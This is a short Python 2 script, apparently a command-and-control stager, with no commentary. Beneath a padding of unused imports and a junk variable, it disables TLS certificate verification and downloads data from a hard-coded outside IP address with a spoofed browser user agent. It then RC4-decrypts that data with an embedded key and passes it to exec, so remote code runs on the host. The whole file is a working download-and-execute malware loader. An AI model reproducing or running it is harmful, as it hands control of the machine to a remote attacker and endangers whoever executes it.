import sys
import copy
import zlib
import __future__
import OpenSSL
import hashlib
import random
import pwd
import BaseHTTPServer
import struct, time, base64, subprocess, random, time, datetime
from StringIO import StringIO
import threading
import socket
from urllib import urlopen
import imp
import urllib2
import string
import os
import zipfile
from threading import Thread
import hmac
import io
from os.path import expanduser
import shlex
import struct
import trace
import ssl
hfdJZZUyonaBrF='buOznuUcrBlIth'
import ssl;
if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
import sys, urllib2;o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();UA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0';o.addheaders=[('User-Agent',UA)];a=o.open('https://218.255.22.254:443/index.asp').read();key='e9ef4775f2c07da0ecfad1ff02aee816';S,j,out=range(256),0,[]
for i in range(256):
    j=(j+S[i]+ord(key[i%len(key)]))%256
    S[i],S[j]=S[j],S[i]
i=j=0
for char in a:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
exec(''.join(out))